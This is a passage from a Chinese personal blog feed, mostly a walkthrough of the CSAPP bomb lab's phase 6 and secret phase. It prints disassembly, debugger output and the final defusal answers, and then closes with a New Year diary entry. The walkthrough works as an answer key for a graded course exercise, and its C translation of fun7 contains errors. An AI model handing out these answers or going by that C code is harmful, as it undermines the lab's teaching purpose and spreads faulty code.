bomb[0x40116f] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+123</span><span class="token punctuation">></span></span>: movl   $0x0, %esi
bomb[0x401174] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+128</span><span class="token punctuation">></span></span>: jmp    0x401197                  ; <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+163</span><span class="token punctuation">></span></span>
bomb[0x401176] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+130</span><span class="token punctuation">></span></span>: movq   0x8(%rdx), %rdx
bomb[0x40117a] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+134</span><span class="token punctuation">></span></span>: addl   $0x1, %eax
bomb[0x40117d] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+137</span><span class="token punctuation">></span></span>: cmpl   %ecx, %eax
bomb[0x40117f] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+139</span><span class="token punctuation">></span></span>: jne    0x401176                  ; <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+130</span><span class="token punctuation">></span></span>
bomb[0x401181] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+141</span><span class="token punctuation">></span></span>: jmp    0x401188                  ; <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+148</span><span class="token punctuation">></span></span>
bomb[0x401183] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+143</span><span class="token punctuation">></span></span>: movl   $0x6032d0, %edx
bomb[0x401188] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+148</span><span class="token punctuation">></span></span>: movq   %rdx, 0x20(%rsp,%rsi,2)
bomb[0x40118d] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+153</span><span class="token punctuation">></span></span>: addq   $0x4, %rsi
bomb[0x401191] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+157</span><span class="token punctuation">></span></span>: cmpq   $0x18, %rsi
bomb[0x401195] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+161</span><span class="token punctuation">></span></span>: je     0x4011ab                  ; <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+183</span><span class="token punctuation">></span></span>
bomb[0x401197] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+163</span><span class="token punctuation">></span></span>: movl   (%rsp,%rsi), %ecx
bomb[0x40119a] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+166</span><span class="token punctuation">></span></span>: cmpl   $0x1, %ecx
bomb[0x40119d] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+169</span><span class="token punctuation">></span></span>: jle    0x401183                  ; <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+143</span><span class="token punctuation">></span></span>
bomb[0x40119f] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+171</span><span class="token punctuation">></span></span>: movl   $0x1, %eax
bomb[0x4011a4] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+176</span><span class="token punctuation">></span></span>: movl   $0x6032d0, %edx
bomb[0x4011a9] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+181</span><span class="token punctuation">></span></span>: jmp    0x401176                  ; <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+130</span><span class="token punctuation">></span></span>
bomb[0x4011ab] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+183</span><span class="token punctuation">></span></span>: movq   0x20(%rsp), %rbx
bomb[0x4011b0] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+188</span><span class="token punctuation">></span></span>: leaq   0x28(%rsp), %rax
bomb[0x4011b5] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+193</span><span class="token punctuation">></span></span>: leaq   0x50(%rsp), %rsi
bomb[0x4011ba] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+198</span><span class="token punctuation">></span></span>: movq   %rbx, %rcx
bomb[0x4011bd] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+201</span><span class="token punctuation">></span></span>: movq   (%rax), %rdx
bomb[0x4011c0] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+204</span><span class="token punctuation">></span></span>: movq   %rdx, 0x8(%rcx)
bomb[0x4011c4] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+208</span><span class="token punctuation">></span></span>: addq   $0x8, %rax
bomb[0x4011c8] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+212</span><span class="token punctuation">></span></span>: cmpq   %rsi, %rax
bomb[0x4011cb] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+215</span><span class="token punctuation">></span></span>: je     0x4011d2                  ; <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+222</span><span class="token punctuation">></span></span>
bomb[0x4011cd] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+217</span><span class="token punctuation">></span></span>: movq   %rdx, %rcx
bomb[0x4011d0] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+220</span><span class="token punctuation">></span></span>: jmp    0x4011bd                  ; <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+201</span><span class="token punctuation">></span></span>
bomb[0x4011d2] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+222</span><span class="token punctuation">></span></span>: movq   $0x0, 0x8(%rdx)
bomb[0x4011da] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+230</span><span class="token punctuation">></span></span>: movl   $0x5, %ebp
bomb[0x4011df] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+235</span><span class="token punctuation">></span></span>: movq   0x8(%rbx), %rax
bomb[0x4011e3] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+239</span><span class="token punctuation">></span></span>: movl   (%rax), %eax
bomb[0x4011e5] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+241</span><span class="token punctuation">></span></span>: cmpl   %eax, (%rbx)
bomb[0x4011e7] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+243</span><span class="token punctuation">></span></span>: jge    0x4011ee                  ; <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+250</span><span class="token punctuation">></span></span>
bomb[0x4011e9] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+245</span><span class="token punctuation">></span></span>: callq  0x40143a                  ; explode_bomb
bomb[0x4011ee] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+250</span><span class="token punctuation">></span></span>: movq   0x8(%rbx), %rbx
bomb[0x4011f2] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+254</span><span class="token punctuation">></span></span>: subl   $0x1, %ebp
bomb[0x4011f5] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+257</span><span class="token punctuation">></span></span>: jne    0x4011df                  ; <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+235</span><span class="token punctuation">></span></span>
bomb[0x4011f7] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+259</span><span class="token punctuation">></span></span>: addq   $0x50, %rsp
bomb[0x4011fb] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+263</span><span class="token punctuation">></span></span>: popq   %rbx
bomb[0x4011fc] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+264</span><span class="token punctuation">></span></span>: popq   %rbp
bomb[0x4011fd] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+265</span><span class="token punctuation">></span></span>: popq   %r12
bomb[0x4011ff] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+267</span><span class="token punctuation">></span></span>: popq   %r13
bomb[0x401201] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+269</span><span class="token punctuation">></span></span>: popq   %r14
bomb[0x401203] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+271</span><span class="token punctuation">></span></span>: retq
</code></pre>
<p>代码虽然很长，其实使用<code>stepi</code>还是挺容易弄懂的。首先读取6个数字，并且各不相同。然后，在<code>0x6032d0</code>位置有一个链表，读取这链表的值。</p>
<pre class=" language-html"><code class="language-html">(gdb)x/32wx 0x6032d0
</code></pre>
<p>当然使用radare2很容易发现这里的链表，</p>
<pre class=" language-html"><code class="language-html">[0x004010f4]> pxw 96@obj.node1
0x006032d0  0x0000014c 0x00000001 0x006032e0 0x00000000  L........2`.....
0x006032e0  0x000000a8 0x00000002 0x006032f0 0x00000000  .........2`.....
0x006032f0  0x0000039c 0x00000003 0x00603300 0x00000000  .........3`.....
0x00603300  0x000002b3 0x00000004 0x00603310 0x00000000  .........3`.....
0x00603310  0x000001dd 0x00000005 0x00603320 0x00000000  ........ 3`.....
0x00603320  0x000001bb 0x00000006 0x00000000 0x00000000  ................
</code></pre>
<p>另外，对于读入的数，这里存在一个操作</p>
<pre class=" language-html"><code class="language-html">bomb[0x40115b] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+103</span><span class="token punctuation">></span></span>: movl   $0x7, %ecx
bomb[0x401160] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+108</span><span class="token punctuation">></span></span>: movl   %ecx, %edx
bomb[0x401162] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+110</span><span class="token punctuation">></span></span>: subl   (%rax), %edx
</code></pre>
<p>是的，用7来减每个数并保存。</p>
<p>在这个地方</p>
<pre class=" language-html"><code class="language-html">bomb[0x4011e5] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+241</span><span class="token punctuation">></span></span>: cmpl   %eax, (%rbx)
bomb[0x4011e7] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+243</span><span class="token punctuation">></span></span>: jge    0x4011ee                  ; <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+250</span><span class="token punctuation">></span></span>
</code></pre>
<p>这里暗示节点顺序需要时递减。</p>
<p>所以节点重排应该是<code>3 4 5 6 1 2</code>,考虑之前的7减操作，最终的答案是<code>4 3 2 1 6 5</code></p>
<h2 id="Secret_phase"><a href="#Secret_phase" class="headerlink" title="Secret phase"></a>Secret phase</h2><p>这时候说Congratulations!还稍微早了些，这个还暗藏了一个秘密关卡，藏在了phase_defused中。</p>
<p>首先要在phase_defused函数打断点， 另外反汇编出<code>phase_defused</code>，可以发现</p>
<pre class=" language-html"><code class="language-html">Dump of assembler code for function phase_defused:
   0x00000000004015c4 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+0</span><span class="token punctuation">></span></span>:    sub    $0x78,%rsp
   0x00000000004015c8 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+4</span><span class="token punctuation">></span></span>:    mov    %fs:0x28,%rax
   0x00000000004015d1 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+13</span><span class="token punctuation">></span></span>:    mov    %rax,0x68(%rsp)
   0x00000000004015d6 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+18</span><span class="token punctuation">></span></span>:    xor    %eax,%eax
   0x00000000004015d8 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+20</span><span class="token punctuation">></span></span>:    cmpl   $0x6,0x202181(%rip)        # 0x603760 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>num_input_strings</span><span class="token punctuation">></span></span>
   0x00000000004015df <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+27</span><span class="token punctuation">></span></span>:    jne    0x40163f <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>phase_defused+123</span><span class="token punctuation">></span></span>
   0x00000000004015e1 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+29</span><span class="token punctuation">></span></span>:    lea    0x10(%rsp),%r8
   0x00000000004015e6 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+34</span><span class="token punctuation">></span></span>:    lea    0xc(%rsp),%rcx
   0x00000000004015eb <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+39</span><span class="token punctuation">></span></span>:    lea    0x8(%rsp),%rdx
   0x00000000004015f0 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+44</span><span class="token punctuation">></span></span>:    mov    $0x402619,%esi
   0x00000000004015f5 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+49</span><span class="token punctuation">></span></span>:    mov    $0x603870,%edi
   0x00000000004015fa <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+54</span><span class="token punctuation">></span></span>:    callq  0x400bf0 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>__isoc99_sscanf@plt</span><span class="token punctuation">></span></span>
   0x00000000004015ff <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+59</span><span class="token punctuation">></span></span>:    cmp    $0x3,%eax
   0x0000000000401602 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+62</span><span class="token punctuation">></span></span>:    jne    0x401635 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>phase_defused+113</span><span class="token punctuation">></span></span>
   0x0000000000401604 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+64</span><span class="token punctuation">></span></span>:    mov    $0x402622,%esi
   0x0000000000401609 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+69</span><span class="token punctuation">></span></span>:    lea    0x10(%rsp),%rdi
   0x000000000040160e <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+74</span><span class="token punctuation">></span></span>:    callq  0x401338 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>strings_not_equal</span><span class="token punctuation">></span></span>
   0x0000000000401613 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+79</span><span class="token punctuation">></span></span>:    test   %eax,%eax
   0x0000000000401615 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+81</span><span class="token punctuation">></span></span>:    jne    0x401635 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>phase_defused+113</span><span class="token punctuation">></span></span>
   0x0000000000401617 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+83</span><span class="token punctuation">></span></span>:    mov    $0x4024f8,%edi
   0x000000000040161c <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+88</span><span class="token punctuation">></span></span>:    callq  0x400b10 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>puts@plt</span><span class="token punctuation">></span></span>
   0x0000000000401621 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+93</span><span class="token punctuation">></span></span>:    mov    $0x402520,%edi
   0x0000000000401626 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+98</span><span class="token punctuation">></span></span>:    callq  0x400b10 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>puts@plt</span><span class="token punctuation">></span></span>
   0x000000000040162b <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+103</span><span class="token punctuation">></span></span>:    mov    $0x0,%eax
   0x0000000000401630 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+108</span><span class="token punctuation">></span></span>:    callq  0x401242 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>secret_phase</span><span class="token punctuation">></span></span>
   0x0000000000401635 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+113</span><span class="token punctuation">></span></span>:    mov    $0x402558,%edi
   0x000000000040163a <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+118</span><span class="token punctuation">></span></span>:    callq  0x400b10 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>puts@plt</span><span class="token punctuation">></span></span>
   0x000000000040163f <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+123</span><span class="token punctuation">></span></span>:    mov    0x68(%rsp),%rax
   0x0000000000401644 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+128</span><span class="token punctuation">></span></span>:    xor    %fs:0x28,%rax
   0x000000000040164d <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+137</span><span class="token punctuation">></span></span>:    je     0x401654 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>phase_defused+144</span><span class="token punctuation">></span></span>
   0x000000000040164f <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+139</span><span class="token punctuation">></span></span>:    callq  0x400b30 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>__stack_chk_fail@plt</span><span class="token punctuation">></span></span>
   0x0000000000401654 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+144</span><span class="token punctuation">></span></span>:    add    $0x78,%rsp
   0x0000000000401658 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+148</span><span class="token punctuation">></span></span>:    retq
</code></pre>
<p>其中<code>secret_phase</code>的源码</p>
<pre class=" language-html"><code class="language-html">Dump of assembler code for function secret_phase:
=> 0x0000000000401242 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+0</span><span class="token punctuation">></span></span>:    push   %rbx
   0x0000000000401243 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+1</span><span class="token punctuation">></span></span>:    callq  0x40149e <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>read_line</span><span class="token punctuation">></span></span>
   0x0000000000401248 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+6</span><span class="token punctuation">></span></span>:    mov    $0xa,%edx
   0x000000000040124d <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+11</span><span class="token punctuation">></span></span>:    mov    $0x0,%esi
   0x0000000000401252 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+16</span><span class="token punctuation">></span></span>:    mov    %rax,%rdi
   0x0000000000401255 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+19</span><span class="token punctuation">></span></span>:    callq  0x400bd0 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>strtol@plt</span><span class="token punctuation">></span></span>
   0x000000000040125a <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+24</span><span class="token punctuation">></span></span>:    mov    %rax,%rbx
   0x000000000040125d <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+27</span><span class="token punctuation">></span></span>:    lea    -0x1(%rax),%eax
   0x0000000000401260 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+30</span><span class="token punctuation">></span></span>:    cmp    $0x3e8,%eax
   0x0000000000401265 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+35</span><span class="token punctuation">></span></span>:    jbe    0x40126c <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>secret_phase+42</span><span class="token punctuation">></span></span>
   0x0000000000401267 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+37</span><span class="token punctuation">></span></span>:    callq  0x40143a <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>explode_bomb</span><span class="token punctuation">></span></span>
   0x000000000040126c <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+42</span><span class="token punctuation">></span></span>:    mov    %ebx,%esi
   0x000000000040126e <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+44</span><span class="token punctuation">></span></span>:    mov    $0x6030f0,%edi
   0x0000000000401273 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+49</span><span class="token punctuation">></span></span>:    callq  0x401204 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>fun7</span><span class="token punctuation">></span></span>
   0x0000000000401278 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+54</span><span class="token punctuation">></span></span>:    cmp    $0x2,%eax
   0x000000000040127b <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+57</span><span class="token punctuation">></span></span>:    je     0x401282 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>secret_phase+64</span><span class="token punctuation">></span></span>
   0x000000000040127d <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+59</span><span class="token punctuation">></span></span>:    callq  0x40143a <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>explode_bomb</span><span class="token punctuation">></span></span>
   0x0000000000401282 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+64</span><span class="token punctuation">></span></span>:    mov    $0x402438,%edi
   0x0000000000401287 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+69</span><span class="token punctuation">></span></span>:    callq  0x400b10 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>puts@plt</span><span class="token punctuation">></span></span>
   0x000000000040128c <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+74</span><span class="token punctuation">></span></span>:    callq  0x4015c4 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>phase_defused</span><span class="token punctuation">></span></span>
   0x0000000000401291 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+79</span><span class="token punctuation">></span></span>:    pop    %rbx
   0x0000000000401292 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+80</span><span class="token punctuation">></span></span>:    retq
</code></pre>
<p>其中，<code>fun7</code>的返回值和2进行了比较，相等则正确，所以可以确定<code>fun7</code>一定要返回2。跳转到<code>fun7</code></p>
<pre class=" language-html"><code class="language-html">bomb`fun7:
bomb[0x401204] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+0</span><span class="token punctuation">></span></span>:  subq   $0x8, %rsp
bomb[0x401208] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+4</span><span class="token punctuation">></span></span>:  testq  %rdi, %rdi
bomb[0x40120b] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+7</span><span class="token punctuation">></span></span>:  je     0x401238                  ; <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+52</span><span class="token punctuation">></span></span>
bomb[0x40120d] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+9</span><span class="token punctuation">></span></span>:  movl   (%rdi), %edx
bomb[0x40120f] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+11</span><span class="token punctuation">></span></span>: cmpl   %esi, %edx
bomb[0x401211] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+13</span><span class="token punctuation">></span></span>: jle    0x401220                  ; <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+28</span><span class="token punctuation">></span></span>
bomb[0x401213] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+15</span><span class="token punctuation">></span></span>: movq   0x8(%rdi), %rdi
bomb[0x401217] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+19</span><span class="token punctuation">></span></span>: callq  0x401204                  ; <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+0</span><span class="token punctuation">></span></span>
bomb[0x40121c] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+24</span><span class="token punctuation">></span></span>: addl   %eax, %eax
bomb[0x40121e] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+26</span><span class="token punctuation">></span></span>: jmp    0x40123d                  ; <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+57</span><span class="token punctuation">></span></span>
bomb[0x401220] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+28</span><span class="token punctuation">></span></span>: movl   $0x0, %eax
bomb[0x401225] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+33</span><span class="token punctuation">></span></span>: cmpl   %esi, %edx
bomb[0x401227] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+35</span><span class="token punctuation">></span></span>: je     0x40123d                  ; <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+57</span><span class="token punctuation">></span></span>
bomb[0x401229] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+37</span><span class="token punctuation">></span></span>: movq   0x10(%rdi), %rdi
bomb[0x40122d] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+41</span><span class="token punctuation">></span></span>: callq  0x401204                  ; <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+0</span><span class="token punctuation">></span></span>
bomb[0x401232] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+46</span><span class="token punctuation">></span></span>: leal   0x1(%rax,%rax), %eax
bomb[0x401236] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+50</span><span class="token punctuation">></span></span>: jmp    0x40123d                  ; <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+57</span><span class="token punctuation">></span></span>
bomb[0x401238] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+52</span><span class="token punctuation">></span></span>: movl   $0xffffffff, %eax
bomb[0x40123d] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+57</span><span class="token punctuation">></span></span>: addq   $0x8, %rsp
bomb[0x401241] <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+61</span><span class="token punctuation">></span></span>: retq
</code></pre>
<p>可以根据上面的代码，写出C语言的递归函数:</p>
<pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">//这里假设%rdi为x, %esi为y</span>

<span class="token keyword">int</span> <span class="token function">fun7</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span>x<span class="token punctuation">,</span> <span class="token keyword">int</span> y<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>x <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token keyword">int</span> ret <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">*</span>x <span class="token operator">-</span> y <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        ret <span class="token operator">=</span> <span class="token function">fun7</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>x <span class="token operator">+</span> <span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token punctuation">;</span>
        ret <span class="token operator">=</span> ret <span class="token operator">*</span> <span class="token number">2</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>    
    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">*</span>x <span class="token operator">==</span> y<span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">else</span>
    <span class="token punctuation">{</span>
        ret <span class="token operator">=</span> <span class="token function">fun7</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>x <span class="token operator">+</span> <span class="token number">0x8</span><span class="token punctuation">)</span><span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">;</span>
        ret <span class="token operator">*</span><span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>那么，为了让fun7返回得到2，需要执行三次递归。</p>
<pre class=" language-html"><code class="language-html">2 = 2 * 1
1 = 2 * 0 + 1
0 = 0
</code></pre>
<p>所以可以得知%rdi也就是0x6030f0这个地址进行了2次增加。递归最深处得到(%rdi)和%rsi相等。用0x6030f0增加(0x8+0x10),得到<code>0x16</code>,转化为十进制就是答案<code>22</code>.</p>
<p><img src="suc.png" alt=""></p>
<h1 id="u6700_u540E"><a href="#u6700_u540E" class="headerlink" title="最后"></a>最后</h1><p>通过不到两天的思考，虽然不是很容易，经过各种查资料和思考，最终完成了这个lab。第三章节的结束，也是第四章的开始，路漫漫其修远兮，吾将上下而求索。</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[2016的第一篇日记]]></title>
      <url>http://xinqiu.me/2016/01/01/Dairy-5/</url>
      <content type="html"><![CDATA[<p>今天是2016年的第一天，想起来本该在昨天做一个年终总结的，没想到被耽搁了。今天就简单做个总结并记录一些新年的计划吧。</p>
<p>突然发现自己对2015年的玩乐记忆不是很多，留在心里的就是吃了两次比较好吃的日料(原谅我是个吃货)。</p>
<p>其实细细想想，这一年已经让我与名校的学生拉开了很大的差距，说实话，我并没做到挑灯夜战到凌晨一两点。我仅仅能做到几乎不晚游戏和坚持除周末外的早起背单词。曾经的热血方刚如今变成靠毅力来坚持走实现理想的路。编程这块真的是有个大牛带才会轻松一点，一个人的路真心不好走。</p>
<p>随着python的学习越来越深入，说实话我挺喜欢这个语言的。人生苦短，我用python。无奈学校的路线是Java，为了应付学校的课程安排，只得将学python的一部分尽量稍微用在了点Java上。</p>
<p>过去的一年，收获是有，但总觉得不足。</p>
<p>只希望新的一年里，能看完CSAPP并刷一遍labs，看点SICP和CLRS，刷一遍Leetcode。C++可以再拿起来看看了。业余小活动，就花在点iOS开发上吧。</p>
<p>以上。</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Flask补坑记录]]></title>
      <url>http://xinqiu.me/2015/12/21/Learn-Flask/</url>
